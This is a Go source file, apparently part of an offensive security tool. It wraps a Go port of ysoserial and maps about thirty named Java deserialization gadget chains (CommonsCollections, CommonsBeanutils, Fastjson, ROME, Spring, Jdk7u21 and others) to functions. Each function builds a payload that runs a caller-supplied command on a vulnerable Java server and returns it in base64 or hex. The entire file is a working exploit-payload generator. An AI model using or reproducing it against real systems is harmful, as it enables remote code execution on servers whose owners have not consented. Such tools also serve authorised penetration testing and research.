package utils

import (
	"encoding/base64"
	"encoding/hex"

	ysoserial "github.com/nu1r/GlangYsoserial/Gadget"
)

// 枚举
const (
	// URLDNS
	URLDNS = "URLDNS"
	// Click1
	Click1 = "Click1"
	// Clojure
	Clojure = "Clojure"
	// CommonsBeanutils1
	CommonsBeanutils1 = "CommonsBeanutils1"
	// CommonsBeanutils2
	CommonsBeanutils2 = "CommonsBeanutils2"
	// CommonsCollections1
	CommonsCollections1 = "CommonsCollections1"
	// CommonsCollections2
	CommonsCollections2 = "CommonsCollections2"
	// CommonsCollections3
	CommonsCollections3 = "CommonsCollections3"
	// CommonsCollections4
	CommonsCollections4 = "CommonsCollections4"
	// CommonsCollections5
	CommonsCollections5 = "CommonsCollections5"
	// CommonsCollections6
	CommonsCollections6 = "CommonsCollections6"
	// CommonsCollections7
	CommonsCollections7 = "CommonsCollections7"
	// CommonsCollections8
	CommonsCollections8 = "CommonsCollections8"
	// CommonsCollections9
	CommonsCollections9 = "CommonsCollections9"
	// CommonsCollections10
	CommonsCollections10 = "CommonsCollections10"
	// CommonsCollections11
	CommonsCollections11 = "CommonsCollections11"
	// CommonsCollections12
	CommonsCollections12 = "CommonsCollections12"
	// CommonsCollectionsK1
	CommonsCollectionsK1 = "CommonsCollectionsK1"
	// CommonsCollectionsK2
	CommonsCollectionsK2 = "CommonsCollectionsK2"
	// Fastjson1
	Fastjson1 = "Fastjson1"
	// Fastjson2
	Fastjson2 = "Fastjson2"
	// Groovy1
	Groovy1 = "Groovy1"
	// Jdk7u21
	Jdk7u21 = "Jdk7u21"
	// Jdk8u20
	Jdk8u20 = "Jdk8u20"
	// ROME
	ROME = "ROME"
	// ROME2
	ROME2 = "ROME2"
	// ROME3
	ROME3 = "ROME3"
	// Spring1
	Spring1 = "Spring1"
	// Spring2
	Spring2 = "Spring2"
)

const (
	Base64Type = "base64"
	HexType    = "hex"
)

func GetYsoserial(payload, command, encodeType string) string {
	result := []byte{}

	switch payload {
	case URLDNS:
		result = ysoserial.URLDNS(command)
	case Click1:
		result = ysoserial.Click1([]byte(command))
	case Clojure:
		result = ysoserial.Clojure(command)
	case CommonsBeanutils1:
		result = ysoserial.CommonsBeanutils1([]byte(command))
	case CommonsBeanutils2:
		result = ysoserial.CommonsBeanutils2([]byte(command))
	case CommonsCollections1:
		result = ysoserial.CommonsCollections1(command)
	case CommonsCollections2:
		result = ysoserial.CommonsCollections2([]byte(command))
	case CommonsCollections3:
		result = ysoserial.CommonsCollections3([]byte(command))
	case CommonsCollections4:
		result = ysoserial.CommonsCollections4([]byte(command))
	case CommonsCollections5:
		result = ysoserial.CommonsCollections5(command)
	case CommonsCollections6:
		result = ysoserial.CommonsCollections6(command)
	case CommonsCollections7:
		result = ysoserial.CommonsCollections7(command)
	case CommonsCollections8:
		result = ysoserial.CommonsCollections8([]byte(command))
	case CommonsCollections9:
		result = ysoserial.CommonsCollections9(command)
	case CommonsCollections10:
		result = ysoserial.CommonsCollections10([]byte(command))
	case CommonsCollections11:
		result = ysoserial.CommonsCollections11(command)
	case CommonsCollections12:
		result = ysoserial.CommonsCollections12(command)
	case CommonsCollectionsK1:
		result = ysoserial.CommonsCollectionsK1([]byte(command))
	case CommonsCollectionsK2:
		result = ysoserial.CommonsCollectionsK2([]byte(command))
	case Fastjson1:
		result = ysoserial.Fastjson1([]byte(command))
	case Fastjson2:
		result = ysoserial.Fastjson2([]byte(command))
	case Groovy1:
		result = ysoserial.Groovy1(command)
	case Jdk7u21:
		result = ysoserial.Jdk7u21([]byte(command))
	case Jdk8u20:
		result = ysoserial.Jdk8u20([]byte(command))
	case ROME:
		result = ysoserial.ROME([]byte(command))
	case ROME2:
		result = ysoserial.ROME2([]byte(command))
	case ROME3:
		result = ysoserial.ROME3([]byte(command))
	case Spring1:
		result = ysoserial.Spring1([]byte(command))
	case Spring2:
		result = ysoserial.Spring2([]byte(command))

	}

	if len(result) > 0 && encodeType == Base64Type {
		return base64.StdEncoding.EncodeToString(result)
	}
	if len(result) > 0 && encodeType == HexType {
		return hex.EncodeToString(result)
	}

	return "ysoserial not found"
}
